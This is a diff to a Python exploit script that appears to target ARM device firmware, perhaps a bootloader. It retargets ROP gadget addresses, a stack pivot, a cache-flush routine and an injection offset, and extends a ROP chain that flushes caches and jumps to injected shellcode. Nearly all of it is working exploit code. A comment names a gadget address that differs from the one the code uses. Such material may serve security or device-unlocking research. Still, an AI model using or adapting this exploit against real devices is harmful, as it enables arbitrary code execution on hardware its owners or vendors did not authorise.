@@ -4,30 +4,28 @@ import struct
 
 base = 0x41E00000
 
-#   404c0:       bd8f            pop     {r0, r1, r2, r3, r7, pc}
-pop_r0_r1_r2_r3_r7_pc = base + 0x404c0|1
+#   404c0:       bdff            pop {r0, r1, r3, r4, r5, r6, r7, pc}
+pop_r0_r1_r2_r3_r4_r5_r6_r7_pc = base + 0x130dc|1
 
+#   26a80:       bd00            pop     {pc}
+pop_pc = base + 0x26a80|1
 
-#   266a0:       bd00            pop     {pc}
-pop_pc = base + 0x266a0|1
+#   1a8d6:       4798            blx     r3; movs    r0, #0 ;pop     {r3, pc}
+blx_r3_pop_r3 = base + 0x1a8d6|1
 
-#   244b2:       4798            blx     r3; movs    r0, #0 ;pop     {r3, pc}
-blx_r3_pop_r3 = base + 0x244b2|1
+cache_func = 0x41e191e0
 
-cache_func = base + 0x231E4
-
-test = base + 0x177 # prints "Error, the pointer of pidme_data is NULL."
+test = 0x41e00177 # prints "Error, the pointer of pidme_data is NULL."
 
 crafted_hdr_sz = 0x70
 page_size = 4 # at least 4 for alignment
 # NOTE: crafted_hdr_sz bytes before inject_addr become corrupt
 # 2 * page_size bytes after inject_addr+inject_sz become corrupt
-inject_addr = base + 0x30C 
+inject_addr = base + 0x37C # 08 4b
 inject_sz = 0x200 - crafted_hdr_sz
 
-#   1fdbc:       e893ad10        ldm     r3, {r4, r8, sl, fp, sp, pc}
-pivot = base + 0x1fdbc
-
+#   15fbc:       e893ad10        ldm     r3, {r4, r8, sl, fp, sp, pc}
+pivot = base + 0x15fbc
 
 def main():
 
@@ -74,15 +72,18 @@ def main():
     # rop chain
     # clean dcache, flush icache, then jump to payload
     chain = [
-        pop_r0_r1_r2_r3_r7_pc,
+        pop_r0_r1_r2_r3_r4_r5_r6_r7_pc,
         -1,             # r0
         0x1000,         # r1
         0xDEAD,         # r2
         cache_func,     # r3
+        0xDEAD,         # r4
+        0xDEAD,         # r5
+        0xDEAD,         # r6
         0xDEAD,         # r7
-        blx_r3_pop_r3,
-        0xDEAD,
-        -1
+        blx_r3_pop_r3,  # pc
+        0xDEAD,         # r3
+        -1              # pc
     ]
     shellcode_addr = inject_addr + len(body) + len(chain) * 4
     print("shellcode base = 0x{:X}".format(shellcode_addr))
